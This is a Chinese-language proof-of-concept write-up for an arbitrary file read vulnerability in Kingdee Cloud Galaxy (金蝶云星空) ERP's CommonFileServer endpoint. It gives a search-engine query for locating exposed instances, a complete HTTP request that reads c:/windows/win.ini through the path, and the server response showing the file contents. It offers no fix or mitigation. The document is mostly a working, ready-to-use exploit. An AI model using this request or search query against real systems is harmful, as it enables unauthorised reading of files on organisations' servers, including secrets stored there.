# 金蝶云星空 CommonFileserver 任意文件读取漏洞

## 1.漏洞描述

金蝶云星空是金蝶集团面向大中型企业的一个核心产品，聚焦多组织，多利润中心的企业。它以“开放、标准、社交”三大特性为数字经济时代的企业提供开放的ERP云平台。该产品CommonFileServer存在任意文件读取漏洞。

## 2.搜索语法

```plain
title="金蝶云星空 管理中心"
```

## 3.漏洞复现

```plain
GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
Host: 127.0.0.1
accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

响应包如下：

```plain
HTTP/1.1 200 OK
Cache-Control: private
Pragma: public
Content-Length: 167
Content-Type: application/x-zip-compressed; charset=utf-8
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=win.ini
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 13 Jun 2024 13:38:51 GMT

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
```

![image](https://github.com/hardog123/poc-exp/assets/170905460/b3527ba9-0a3b-42da-b813-083ed94eb58f)
